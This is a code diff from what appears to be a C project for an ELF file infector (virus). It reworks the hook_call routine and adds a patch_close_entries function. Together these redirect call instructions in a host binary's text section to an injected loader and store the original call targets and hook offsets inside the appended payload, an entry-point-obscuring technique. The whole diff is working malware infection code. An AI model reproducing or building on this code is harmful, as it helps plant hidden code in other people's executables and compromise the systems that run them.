@@ -125,19 +125,41 @@ static void	hook_call(t_info *info, int32_t nb)
 
 	// get addr of loader
 	new_jmp = (int32_t)(info->text_size - (size_t)((size_t)(info->addr_call_to_replace) - (size_t)(info->text_begin)) - 5);
-	// Add offset depending of nb
-// 	if (nb == 1)
-// 		new_jmp += 0x0;//REPLACE1
-// 	if (nb == 2)
-// 		new_jmp += 0x4;//REPLACE2
-// 	if (nb == 3)
-// 		new_jmp += 0x8;//REPLACE3
-// 	if (nb == 4)
-// 		new_jmp += 0xb;//REPLACE4
-// 	if (nb == 5)
-// 		new_jmp += 0x10;//REPLACE5
 	new_jmp += ((nb - 1) * 4);
 	ft_memcpy(info->addr_call_to_replace + 1, &new_jmp, sizeof(new_jmp));
+
+
+}
+
+static void	patch_close_entries(t_info *info, int32_t nb)
+{
+	uint32_t	origin;
+	uint32_t	addr_hook;
+
+	origin = *(uint32_t *)(info->addr_call_to_replace + 1);
+	if (nb == 1)
+		ft_memcpy(info->file + info->offset_bis + BIS_SIZE + OFFSET_CALL_1, &origin, 4);
+	if (nb == 2)
+		ft_memcpy(info->file + info->offset_bis + BIS_SIZE + OFFSET_CALL_2, &origin, 4);
+	if (nb == 3)
+		ft_memcpy(info->file + info->offset_bis + BIS_SIZE + OFFSET_CALL_3, &origin, 4);
+	if (nb == 4)
+		ft_memcpy(info->file + info->offset_bis + BIS_SIZE + OFFSET_CALL_4, &origin, 4);
+	if (nb == 5)
+		ft_memcpy(info->file + info->offset_bis + BIS_SIZE + OFFSET_CALL_5, &origin, 4);
+
+	addr_hook = (uint32_t)((size_t)(info->addr_call_to_replace) - (size_t)(info->file)) + 1;
+	if (nb == 1)
+		ft_memcpy(info->file + info->offset_bis + BIS_SIZE + OFFSET_HOOK_1, &addr_hook, 4);
+	if (nb == 2)
+		ft_memcpy(info->file + info->offset_bis + BIS_SIZE + OFFSET_HOOK_2, &addr_hook, 4);
+	if (nb == 3)
+		ft_memcpy(info->file + info->offset_bis + BIS_SIZE + OFFSET_HOOK_3, &addr_hook, 4);
+	if (nb == 4)
+		ft_memcpy(info->file + info->offset_bis + BIS_SIZE + OFFSET_HOOK_4, &addr_hook, 4);
+	if (nb == 5)
+		ft_memcpy(info->file + info->offset_bis + BIS_SIZE + OFFSET_HOOK_5, &addr_hook, 4);
+
 }
 
 void		epo_parsing(t_info *info)
@@ -179,6 +201,7 @@ void		epo_parsing(t_info *info)
 			{
 				nb++;
 				info->addr_call_to_replace = info->text_begin + i;
+				patch_close_entries(info, nb);
 				hook_call(info, nb);
 				patch_bis(info, nb);
 			}
